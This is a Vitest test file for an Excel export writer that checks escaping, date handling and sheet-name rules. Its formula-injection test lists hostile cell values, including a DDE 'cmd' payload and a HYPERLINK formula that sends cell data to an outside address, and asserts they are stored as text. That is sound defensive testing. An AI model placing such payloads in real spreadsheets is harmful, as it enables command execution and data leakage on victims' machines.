/**
 * QA (tester) — ExcelJS writer (spec §11 output.excel, AC-06). Output is read back with
 * SheetJS and by inspecting the raw sheet XML. Fake data only.
 * "KNOWN BUGS" tests use `it.fails` (they assert the expected behaviour and currently fail).
 */
import { describe, expect, it } from 'vitest';
import * as XLSX from 'xlsx';
import { Big } from '../core/decimal';
import type { ColumnDef, Table, Value } from '../core/types';
import { uniqueSheetName, writeWorkbook } from '../io/excel-writer';

const cols: ColumnDef[] = [
  { key: 'ma_nv', type: 'string', title: 'Mã NV' },
  { key: 'cong', type: 'decimal', title: 'Công' },
  { key: 'ngay', type: 'date', title: 'Ngày' },
];
const table = (rows: Record<string, Value>[], columns = cols): Table => ({ columns, rows });

async function roundTrip(sheets: { name: string; table: Table }[]) {
  const bytes = await writeWorkbook(sheets);
  const wb = XLSX.read(bytes, { type: 'array', cellFormula: true, cellNF: true, bookFiles: true });
  return { bytes, wb };
}

/** Raw XML of the first worksheet + shared strings (SheetJS keeps the zip with bookFiles). */
function rawXml(wb: XLSX.WorkBook): string {
  const files = (wb as unknown as { files?: Record<string, { content?: unknown }> }).files ?? {};
  const decode = (c: unknown) =>
    c instanceof Uint8Array ? new TextDecoder().decode(c) : typeof c === 'string' ? c : '';
  return Object.entries(files)
    .filter(([n]) => /xl\/(worksheets\/sheet\d+|sharedStrings)\.xml$/.test(n))
    .map(([, f]) => decode(f.content))
    .join('\n');
}

describe('QA writer: values', () => {
  it('formula-looking user strings are written as text, never as formulas (formula injection)', async () => {
    const evil = [
      '=HYPERLINK("http://example.invalid/?x="&A1,"click")',
      '+1+1',
      '-2+3',
      '@SUM(1,1)',
      "=cmd|' /C calc'!A0",
    ];
    const { wb } = await roundTrip([
      { name: 'S', table: table(evil.map((v) => ({ ma_nv: v, cong: null, ngay: null }))) },
    ]);
    const ws = wb.Sheets.S!;
    evil.forEach((v, i) => {
      const cell = ws[`A${i + 2}`] as XLSX.CellObject;
      expect(cell.t).toBe('s');
      expect(cell.v).toBe(v);
      expect(cell.f).toBeUndefined();
    });
    expect(rawXml(wb)).not.toMatch(/<f>/);
  });

  it('XML special characters round-trip', async () => {
    const v = `<a href="x">&amp; 'q' </a> ]]> Nguyễn Văn Ánh`;
    const { wb } = await roundTrip([
      { name: 'S', table: table([{ ma_nv: v, cong: null, ngay: null }]) },
    ]);
    expect((wb.Sheets.S!.A2 as XLSX.CellObject).v).toBe(v);
  });

  it('decimals become numbers with #,##0.00; dates become real dates with dd/mm/yyyy; nulls stay empty', async () => {
    const { wb } = await roundTrip([
      {
        name: 'S',
        table: table([
          { ma_nv: 'NV00001', cong: new Big('-0.5'), ngay: '2026-09-01' },
          { ma_nv: 'NV00002', cong: null, ngay: null },
        ]),
      },
    ]);
    const ws = wb.Sheets.S!;
    expect(ws.B2).toMatchObject({ t: 'n', v: -0.5, z: '#,##0.00' });
    expect((ws.C2 as XLSX.CellObject).t).toBe('n');
    expect((ws.C2 as XLSX.CellObject).v).toBe(46266); // 2026-09-01 in the 1900 system
    expect(ws.B3).toBeUndefined();
    expect(ws.C3).toBeUndefined();
  });

  it('date serial is independent of the process time zone', async () => {
    const prev = process.env.TZ;
    try {
      for (const tz of ['Asia/Ho_Chi_Minh', 'America/Los_Angeles', 'UTC']) {
        process.env.TZ = tz;
        const { wb } = await roundTrip([
          { name: 'S', table: table([{ ma_nv: 'x', cong: null, ngay: '2026-09-01' }]) },
        ]);
        expect((wb.Sheets.S!.C2 as XLSX.CellObject).v, tz).toBe(46266);
      }
    } finally {
      if (prev === undefined) delete process.env.TZ;
      else process.env.TZ = prev;
    }
  });

  it('header row: bold, frozen, auto-filter covering all columns', async () => {
    const { wb } = await roundTrip([{ name: 'S', table: table([]) }]);
    const ws = wb.Sheets.S!;
    expect(ws['!autofilter']).toMatchObject({ ref: 'A1:C1' });
    expect((ws.A1 as XLSX.CellObject).v).toBe('Mã NV');
    expect(rawXml(wb)).toMatch(/<pane[^>]*ySplit="1"[^>]*state="frozen"/);
  });

  it('a table with no columns still produces a valid workbook', async () => {
    const { wb } = await roundTrip([{ name: 'Empty', table: { columns: [], rows: [] } }]);
    expect(wb.SheetNames).toEqual(['Empty']);
  });
});

describe('QA writer: sheet names', () => {
  it('names > 31 chars are truncated and kept unique; invalid chars replaced; case-insensitive', async () => {
    const long1 = 'Chỉ có trong chấm công - chi nhánh Hà Nội 01';
    const long2 = 'Chỉ có trong chấm công - chi nhánh Hà Nội 02';
    const { wb } = await roundTrip([
      { name: long1, table: table([]) },
      { name: long2, table: table([]) },
      { name: 'Lệch', table: table([]) },
      { name: 'LỆCH', table: table([]) },
      { name: 'a/b:c?d*e[f]g\\h', table: table([]) },
      { name: '   ', table: table([]) },
    ]);
    expect(wb.SheetNames).toEqual([
      long1.slice(0, 31),
      `${long1.slice(0, 27)} (2)`,
      'Lệch',
      'LỆCH (2)',
      'a_b_c_d_e_f_g_h',
      'Sheet',
    ]);
    for (const n of wb.SheetNames) expect(n.length).toBeLessThanOrEqual(31);
  });

  it('uniqueSheetName: many collisions grow the suffix within 31 chars', () => {
    const used = new Set<string>();
    const names = Array.from({ length: 12 }, () => uniqueSheetName('x'.repeat(40), used));
    expect(new Set(names).size).toBe(12);
    expect(names.at(-1)).toBe(`${'x'.repeat(26)} (12)`);
  });
});

describe('QA writer: XML safety', () => {
  it('control characters in cell text do not produce invalid XML', async () => {
    // U+0001 can reach us from source cells (_x0001_ escapes); XML 1.0 forbids it raw.
    const { wb } = await roundTrip([
      { name: 'S', table: table([{ ma_nv: 'NV\u0001 00001\u0008', cong: null, ngay: null }]) },
    ]);
    // eslint-disable-next-line no-control-regex
    expect(rawXml(wb)).not.toMatch(/[\u0000-\u0008\u000b\u000c\u000e-\u001f]/);
  });
});

describe('KNOWN BUGS (writer)', () => {
  it.fails(
    'BUG-W1: a sheet name starting/ending with an apostrophe is sanitized instead of throwing',
    async () => {
      // Excel forbids a leading/trailing "'" in sheet names; ExcelJS throws, writeWorkbook does not
      // sanitize it and OutputExcelConfigSchema does not reject it.
      const bytes = await writeWorkbook([{ name: "'Lệch'", table: table([]) }]);
      expect(bytes.byteLength).toBeGreaterThan(0);
    },
  );
});
